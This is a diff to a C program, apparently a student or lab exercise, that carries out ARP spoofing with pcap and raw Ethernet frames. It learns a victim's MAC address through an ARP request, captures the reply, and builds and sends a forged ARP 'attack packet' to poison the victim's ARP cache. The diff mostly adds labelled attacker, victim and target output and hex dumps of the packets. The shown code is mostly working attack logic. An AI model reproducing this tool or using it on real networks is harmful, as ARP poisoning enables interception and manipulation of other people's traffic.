@@ -119,14 +119,17 @@ int main(int argc, char *argv[])
 		printf("hwaddr error.\n"), exit(0);
 
 	memcpy(my_mac, ifr.ifr_hwaddr.sa_data, sizeof(my_mac));
-	printf("HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
+	printf("Attacker HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n", my_mac[0], my_mac[1], my_mac[2], my_mac[3], my_mac[4], my_mac[5]);
 
 	//get inet addr
 	if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0)
 		printf("ioctl error.\n"), exit(0);
 
 	my_ip = (struct sockaddr_in *)&(ifr.ifr_addr);
-	printf("inet addr: %s\n", inet_ntoa(my_ip->sin_addr));
+	printf("Attacker inet addr: %s\n", inet_ntoa(my_ip->sin_addr));
+
+	printf("Sender(Victim) inet addr: %s\n", inet_ntoa(*send_ip));
+	printf("Target inet addr: %s\n\n", inet_ntoa(*target_ip));
 
 	// make arp request
 	uint8_t *packet_arp_req = (uint8_t *)malloc(sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 21);
@@ -149,6 +152,7 @@ int main(int argc, char *argv[])
 	memset(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 10, 0, 6);
 	*(uint32_t *)(packet_arp_req + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 16) = send_ip->s_addr;
 
+	printf("ARP request sent\n");
 	uint8_t *tmp = packet_arp_req;
 	for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
 	{
@@ -156,7 +160,7 @@ int main(int argc, char *argv[])
 		if ((i & 0x0f) == 0x0f)
 			printf("\n");
 	}
-	printf("\n");
+	printf("\n\n");
 
 	// pcap open
 	char *dev = argv[1];
@@ -186,6 +190,7 @@ int main(int argc, char *argv[])
 		//printf("%u bytes captured\n", header->caplen);
 		const uint8_t *p = packet;
 		eth = (struct eth_header *)p;
+		tmp = (uint8_t *)p;
 		if (ntohs(eth->type) == 0x0806) // if ARP
 		{
 			p += sizeof(struct eth_header);
@@ -195,7 +200,17 @@ int main(int argc, char *argv[])
 			memcpy(send_mac, p, 6);
 			if ((memcmp(p + 6, send_ip, 4) == 0) && (memcmp(p + 10, my_mac, 6) == 0) && (*(uint32_t *)(p + 16) == ntohl(my_ip->sin_addr.s_addr)))
 			{
-				printf("found ARP reply\n");
+				printf("Captured ARP reply\n");
+				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
+				{
+					printf("%02x ", *(tmp + i));
+					if ((i & 0x0f) == 0x0f)
+						printf("\n");
+				}
+				printf("\n");
+
+				printf("Sender(Victim) HWaddr: %02X:%02X:%02X:%02X:%02X:%02X\n\n", send_mac[0], send_mac[1], send_mac[2], send_mac[3], send_mac[4], send_mac[5]);
+				
 				// make ARP spoofing packet
 				eth->type = htons(0x0806); //ARP
 				memcpy(eth->dst_mac, send_mac, 6);
@@ -216,8 +231,8 @@ int main(int argc, char *argv[])
 				memcpy(packet_arp_atk + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 10, send_mac, 6);
 				*(uint32_t *)(packet_arp_atk + sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 16) = send_ip->s_addr;
 
-				printf("attack packet\n");
-				uint8_t *tmp = packet_arp_atk;
+				printf("ARP attack packet sent\n");
+				tmp = packet_arp_atk;
 				for (int i = 0; i < sizeof(struct eth_header) + sizeof(struct libnet_arp_hdr) + 20; i++)
 				{
 					printf("%02x ", *(tmp + i));
